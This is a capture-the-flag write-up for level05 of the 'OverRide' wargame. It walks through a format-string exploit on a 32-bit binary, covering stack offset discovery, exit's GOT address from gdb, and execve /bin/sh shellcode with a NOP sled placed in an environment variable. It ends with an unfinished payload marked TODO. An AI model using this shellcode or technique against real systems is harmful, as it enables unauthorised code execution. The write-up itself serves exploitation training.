# Level 5

Ah `printf`, don't we love it?

```shell
level05@OverRide:~$ ./level05 
%p
0x64
```
We have another 32bit program with vulnerable format strings on our hands.

Let's find where we control the buffer
```shell
level05@OverRide:~$ ./level05 < <(python -c 'print "BBBB" + "%p|"*10') 
bbbb0x64|0xf7fcfac0|0xf7ec3add|0xffffd6ef|0xffffd6ee|(nil)|0xffffffff|0xffffd774|0xf7fdb000|0x62626262|
```
Oh yeah, our uppercase characters get converted to lowercase, but we can see it's the 10th arg
```shell
level05@OverRide:~$ ./level05 < <(python -c 'print "0000%10$p"')
00000x30303030
```

Ok Let's find the value of `exit` to replace it in the GOT
```shell
level05@OverRide:~$ gdb ./level05                                    
(gdb) disas exit                  
Dump of assembler code for function exit@plt:                        
   0x08048370 <+0>:     jmp    *0x80497e0                            
   0x08048376 <+6>:     push   $0x18                                 
   0x0804837b <+11>:    jmp    0x8048330                             
End of assembler dump.            
```
`0x80497e0` is `exit` in the GOT

But this time we don't just have a function to call, what are we gonna do!
```shell
export PWN=$(python -c 'print "\x90"*500 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
```
Of course! Let's now get the address of our shellcode with some safety margin for good measure.
```shell
level05@OverRide:~$ gdb ./level05 
(gdb) b main
Breakpoint 1 at 0x8048449
(gdb) r
Starting program: /home/users/level05/level05 

Breakpoint 1, 0x08048449 in main ()
(gdb) p (char*)getenv("PWN")
$1 = 0xffffdd10 "\220\220\220\220\220\220\220\220\220\220\220\220...
```
Let's add a good `0x64` just to be safe -> `0xFFFFDD74`
GOT exit -> `0x80497e0`
```shell
(gdb) r < <(python -c 'print "\xe0\x97\x04\x08" + "%{}10$p".format(str(0xFFFFDD74))')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/users/level05/level05 < <(python -c 'print "\xe0\x97\x04\x08" + "%{}10$p".format(str(0xFFFFDD74))')
[Inferior 1 (process 32014) exited normally]
```

TODO
```
level05@OverRide:~$ ./level05   < <(python -c 'print "\xe0\x97\x04\x08" + "%{}$p".format(str(0xffffdd74)) + "%10$n"')
```
